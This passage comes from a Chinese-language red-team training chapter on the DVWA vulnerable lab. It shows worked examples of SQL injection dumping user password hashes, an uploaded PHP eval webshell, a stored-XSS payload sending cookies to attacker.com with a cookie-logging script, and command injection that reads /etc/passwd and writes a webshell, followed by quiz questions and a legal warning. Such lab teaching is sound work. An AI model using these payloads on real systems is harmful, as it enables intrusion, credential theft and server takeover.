   - `-1' union select group_concat(table_name),2 from information_schema.tables where table_schema='dvwa' -- `
   - 结果：guestbook, users

6. 获取列名
   - `-1' union select group_concat(column_name),2 from information_schema.columns where table_name='users' -- `
   - 结果：user_id, first_name, last_name, user, password, avatar, ...

7. 导出管理员凭据
   - `-1' union select user, password from users -- `
   - 结果：admin / 21232f297a57a5a743894a0e4a801fc3（MD5）
   - MD5解密：admin / admin

**总结**：SQL注入的完整流程是：判断注入点 → 猜字段数 → 联合查询 → 脱库 → 解密密码。

---

### 案例3：文件上传绕过实战

**场景**：网站有头像上传功能，尝试上传Webshell获取服务器权限。

**环境**：DVWA File Upload模块，Medium难度

**步骤**：

1. 准备Webshell
   ```php
   <?php
   @eval($_POST['cmd']);
   phpinfo();
   ?>
   ```
   保存为 shell.php

2. 尝试直接上传
   - 上传失败，提示 "Your image was not uploaded."
   - 推测有文件类型验证

3. 抓包分析
   - 用Burp拦截上传请求
   - 查看Content-Type: application/x-php

4. 修改Content-Type绕过
   - 将 Content-Type 改为 image/jpeg
   - 发送请求，上传成功

5. 验证Webshell
   - 访问上传路径：/dvwa/hackable/uploads/shell.php
   - 页面显示 phpinfo() 信息，说明PHP被执行

6. 使用蚁剑连接
   - 连接地址：http://target/dvwa/hackable/uploads/shell.php
   - 连接密码：cmd
   - 成功获取Webshell，可执行命令、管理文件

**总结**：仅验证MIME类型的文件上传是不安全的，可以通过修改Content-Type轻易绕过。

---

### 案例4：XSS利用实战

**场景**：发现一个留言板功能，可能存在存储型XSS，尝试利用它窃取管理员Cookie。

**环境**：DVWA XSS (Stored)模块，Low难度

**步骤**：

1. 测试XSS
   - 在留言框输入 `<script>alert(1)</script>`
   - 提交后页面弹窗，确认存在存储型XSS

2. 准备XSS接收平台
   - 搭建一个简单的Cookie接收脚本（steal.php）
   ```php
   <?php
   $cookie = $_GET['cookie'];
   $ip = $_SERVER['REMOTE_ADDR'];
   $time = date('Y-m-d H:i:s');
   $log = "Time: $time | IP: $ip | Cookie: $cookie\n";
   file_put_contents('cookies.txt', $log, FILE_APPEND);
   ?>
   ```

3. 构造XSS Payload
   ```html
   <script>
   document.location='http://attacker.com/steal.php?c='+document.cookie;
   </script>
   ```

4. 提交Payload
   - 在留言板的name字段中输入上面的Payload
   - 由于name字段有长度限制，用Burp绕过
   - 提交成功

5. 模拟管理员访问
   - 用另一个浏览器以admin身份访问留言板
   - 页面自动跳转到攻击者服务器
   - 查看cookies.txt，成功获取管理员的PHPSESSID

6. Cookie欺骗
   - 使用获取到的PHPSESSID
   - 修改自己浏览器的Cookie
   - 刷新页面，成功以admin身份登录

**总结**：存储型XSS的危害远大于反射型，因为它能影响所有访问用户，配合Cookie窃取可以直接获取用户权限。

---

### 案例5：命令注入实战

**场景**：网站提供了ping功能，用于测试网络连通性，尝试利用它执行系统命令。

**环境**：DVWA Command Injection模块，High难度

**步骤**：

1. 功能测试
   - 输入 127.0.0.1，正常返回ping结果
   - 输入 127.0.0.1; whoami，失败
   - 输入 127.0.0.1 && whoami，失败
   - 推测过滤了 ; 和 &&

2. 尝试绕过
   - `127.0.0.1 | whoami` → 失败（过滤了"| "）
   - `127.0.0.1|whoami` → 成功！（过滤的是"| "带空格的管道符）

3. 信息收集
   ```
   127.0.0.1|id
   127.0.0.1|whoami
   127.0.0.1|uname -a
   127.0.0.1|pwd
   127.0.0.1|ls -la
   ```

4. 读取敏感文件
   ```
   127.0.0.1|cat /etc/passwd
   127.0.0.1|cat /etc/shadow   # 权限不够
   ```

5. 获取Webshell
   - 用命令写入一句话木马：
   ```
   127.0.0.1|echo '<?php eval($_POST[x]);?>' > /var/www/html/dvwa/hackable/shell.php
   ```
   - 验证：访问 /dvwa/hackable/shell.php
   - 用蚁剑连接，密码为x

6. 提权尝试
   - 查看系统信息和内核版本
   - 查找SUID文件
   - 尝试内核漏洞提权

**总结**：命令注入漏洞危害极大，可直接获取服务器控制权。防御的关键是避免将用户输入拼接到系统命令中，使用白名单验证。

---

## ✏️ 课后习题

### 选择题

1. DVWA的默认管理员账号密码是？
   - A. admin / admin
   - B. admin / password
   - C. root / root
   - D. test / test

2. DVWA中，以下哪个难度级别展示了正确的防御方式？
   - A. Low
   - B. Medium
   - C. High
   - D. Impossible

3. 下列哪个符号不能用于命令注入绕过？
   - A. ;
   - B. &&
   - C. |
   - D. #

4. 文件包含漏洞中，读取PHP源码的伪协议是？
   - A. php://input
   - B. php://filter
   - C. data://
   - D. file://

5. SQL盲注中，基于时间延迟的函数是？
   - A. waitfor
   - B. sleep
   - C. delay
   - D. benchmark

6. 存储型XSS和反射型XSS的主要区别是？
   - A. 注入位置不同
   - B. 存储位置不同，存储型存在数据库中
   - C. 危害程度相同
   - D. 利用方式完全不同

7. CSRF攻击的必要条件不包括？
   - A. 用户已登录目标网站
   - B. 用户访问恶意页面
   - C. 目标网站存在XSS漏洞
   - D. 关键操作只依赖Cookie认证

8. DVWA的Brute Force High难度的防护机制是？
   - A. 验证码
   - B. Token验证
   - C. IP限制
   - D. 账户锁定

9. 以下哪种方法不能绕过文件上传的MIME类型验证？
   - A. 修改Content-Type
   - B. 修改文件后缀名为.jpg
   - C. 使用Burp改包
   - D. 制作图片马

10. SQL注入中，information_schema.tables表存储的是？
    - A. 所有数据库名
    - B. 所有表名
    - C. 所有列名
    - D. 所有用户信息

### 填空题

1. DVWA的全称是 _______。
2. 命令注入中常用的连接符有 _______、_______、_______、_______。
3. SQL注入的三种主要类型是 _______、_______、_______。
4. XSS的三种类型是 _______、_______、_______。
5. 文件包含分为 _______ 和 _______ 两种。
6. CSRF的全称是 _______。
7. 暴力破解的英文是 _______。
8. PHP中执行系统命令的函数有 _______、_______、_______。
9. SQL注入中获取数据库名的函数是 _______。
10. 防止CSRF最常用的方法是添加 _______ 验证。

### 简答题

1. 简述DVWA的四种难度级别及各自特点。
2. SQL注入的完整利用流程是什么？
3. 存储型XSS和反射型XSS有什么区别？哪个危害更大？为什么？
4. 文件上传漏洞有哪些常见的绕过方法？
5. 命令注入漏洞的原理是什么？如何防御？
6. CSRF漏洞的原理和利用条件是什么？
7. 如何防御暴力破解攻击？至少说出5种方法。
8. 文件包含漏洞中，PHP伪协议有哪些？各有什么作用？
9. SQL盲注有哪两种类型？各自的原理是什么？
10. 为什么说对比不同难度的源码学习很重要？

### 实操题

1. 使用Docker搭建DVWA环境，并成功登录。
2. 通关Brute Force模块的Low、Medium、High三种难度。
3. 通关SQL Injection模块的三种难度，手工注入获取管理员密码。
4. 通关Command Injection模块的三种难度，执行id和whoami命令。
5. 通关File Upload模块的三种难度，上传Webshell并用蚁剑连接。
6. 通关XSS (Stored)模块的三种难度，实现弹窗。
7. 通关CSRF模块的Low难度，构造恶意页面修改密码。
8. 通关File Inclusion模块，使用php://filter读取config.inc.php的源码。
9. 编写一个Python脚本，实现SQL布尔盲注自动化。
10. 对比Impossible难度的源码，总结每个漏洞的正确防御方式。

---

## ⚠️ 安全提醒

::: danger 重要提醒
1. **仅在授权环境中练习**：本章涉及的所有技术仅限在DVWA等授权靶场中学习和练习，严禁对未授权的真实系统进行测试。

2. **法律后果**：未经授权对他人网站进行暴力破解、SQL注入、XSS攻击、命令注入等均属于违法行为，将承担相应的法律责任。

3. **道德准则**：学习安全技术是为了保护网络安全，而非进行破坏。请遵守网络安全从业者的职业道德。

4. **环境隔离**：确保DVWA运行在隔离的环境中，不要暴露在公网上，以免被他人利用。

5. **数据保护**：不要在靶场中使用真实的个人信息或敏感数据。
:::

---

## 📝 本章小结

- DVWA是Web安全入门的经典靶场，涵盖9大常见Web漏洞模块
- 四种难度级别（Low/Medium/High/Impossible）循序渐进，适合各阶段学习者
- 暴力破解的核心是没有限制登录次数，防御关键是限流+验证码
- 命令注入源于用户输入拼接到系统命令，应使用白名单和安全函数
- SQL注入是最经典的漏洞，分为联合查询、报错注入、盲注等类型
- XSS分为反射型、存储型、DOM型，存储型危害最大
- 文件上传漏洞可直接GetShell，防御需多维度验证
- 文件包含漏洞可读取敏感文件或执行代码，需配合伪协议利用
- CSRF利用用户身份执行非授权操作，Token是有效的防御手段
- 学习时要对比不同难度的源码，从攻击和防御两个角度理解

---

## 🔗 相关链接

- [⬅️ 上一章：---](/redteam/day084-target-靶场系列总览)
- [➡️ 下一章：---](/redteam/day086-target-靶场2-SQLi-Labs)
- [📖 返回全书目录](/redteam/day118-toc-全书目录)
